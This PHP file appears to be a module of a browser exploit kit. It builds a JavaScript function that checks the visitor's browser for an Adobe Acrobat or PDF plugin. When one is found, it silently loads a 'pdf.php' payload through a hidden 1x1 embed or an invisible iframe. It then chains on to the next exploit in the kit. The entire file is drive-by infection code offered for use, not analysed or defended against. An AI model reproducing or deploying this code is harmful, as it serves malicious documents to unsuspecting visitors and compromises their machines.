<?php

$expname = "pdf";
$exploits[] = "
function pdf(){
	var isInstalled = false;
	if (navigator.plugins && navigator.plugins.length){
		for (var x = 0; x < navigator.plugins.length; x++){
			if (navigator.plugins[x].description.indexOf('Adobe Acrobat')!= -1){
				isInstalled = true;
				break;
			}
			if (navigator.plugins[x].description.indexOf('Adobe PDF')!= -1){
				isInstalled = true;
				break;
			}
		}
	} else if (window.ActiveXObject){
		var control = null;
		try {
			control = new ActiveXObject('AcroPDF.PDF');
		} catch (e) {}
		if (!control){
			try {
				control = new ActiveXObject('PDF.PdfCtrl');
			} catch (e) {}
		}
		if (control){
			isInstalled = true;
		}
	}
	if (isInstalled){
		var ua = navigator.userAgent.toLowerCase();
		if (ua.indexOf(\"firefox\") != -1){
			var pdfelement = document.createElement('embed');
			document.body.appendChild(pdfelement);
			pdfelement.width = '1';
			pdfelement.height = '1';
			pdfelement.src = './pdf.php';
			pdfelement.type = 'application/pdf';
		} else {
			var pdfelement = document.createElement('iframe');
			pdfelement.setAttribute('src', './pdf.php');
			pdfelement.setAttribute('width', 200);
			pdfelement.setAttribute('height', 200);
			pdfelement.setAttribute('style', 'display:none;');
			document.body.appendChild(pdfelement);
		}
		setTimeout(\"" . ($config['AjaxCheckBeforeExploit'] ? "if (CheckIP()){ Complete(); } else { %NextExploit% }" : "%NextExploit%") . "\", 2000);
	} else {
		%NextExploit%
	}
}
";


?>